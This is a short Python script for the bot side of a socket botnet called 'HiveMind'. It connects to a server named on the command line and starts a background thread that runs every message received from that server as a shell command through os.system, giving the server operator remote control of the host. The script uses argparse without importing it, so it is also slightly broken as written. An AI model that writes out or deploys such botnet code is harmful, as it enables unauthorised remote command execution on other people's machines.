import socket
import random
from threading import Thread
import os


parser = argparse.ArgumentParser(
    description="HiveMind, python bot net using sockets"
)

parser.add_argument("host", nargs="?", help="Address of the Server")

parser.add_argument(
    "-p", "--port", default=5000, help="Port the Server is running on", type=int
)


args = parser.parse_args()


s = socket.socket()
s.connect((args.host, args.port))
print("[+] Connected.")


bot_number = input(f"What bot number is this?: ")


def listen_for_messages():
    while True:
        message = s.recv(1024).decode()
        if "!connected!" in message:
            connected_bots = f"bot-{bot_number}: connected \n"
            s.send(connected_bots.encode())
        else:
            os.system(f"{message}")


t = Thread(target=listen_for_messages)
t.daemon = True
t.start()



while True:
    to_send =  input()
    if to_send.lower() == 'q':
        break
    to_send = f"bot-{bot_number}: {to_send}"
    s.send(to_send.encode())


s.close()



